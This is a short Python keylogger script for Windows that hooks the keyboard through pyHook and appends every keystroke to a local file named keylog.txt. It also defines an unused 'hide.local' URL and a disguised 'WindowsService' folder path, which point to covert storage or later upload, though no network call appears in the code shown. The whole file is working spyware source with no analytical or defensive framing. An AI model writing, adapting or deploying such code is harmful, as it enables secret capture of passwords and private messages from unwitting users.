import pyHook, pythoncom
import sys

url = 'http://hide.local/'
path = 'C\\Users\\{0}\\Documents\\WindowsService\\WindowsExceptDevice\\'.format('Admin')

class Logger():
	def __init__(self):
		self.hm = pyHook.HookManager()
		
	def SetKeyDownCallback(self, callback):
		self.hm.KeyDown = callback
		
	def StartLogging(self):
		self.hm.HookKeyboard()
		pythoncom.PumpMessages()

def OnKeyboardEvent(event):
	try:
		f = open('keylog.txt', 'a')
		f.write(chr(event.Ascii))
	finally:
		f.close()
	
	return True

logger = Logger()
logger.SetKeyDownCallback(OnKeyboardEvent)
logger.StartLogging()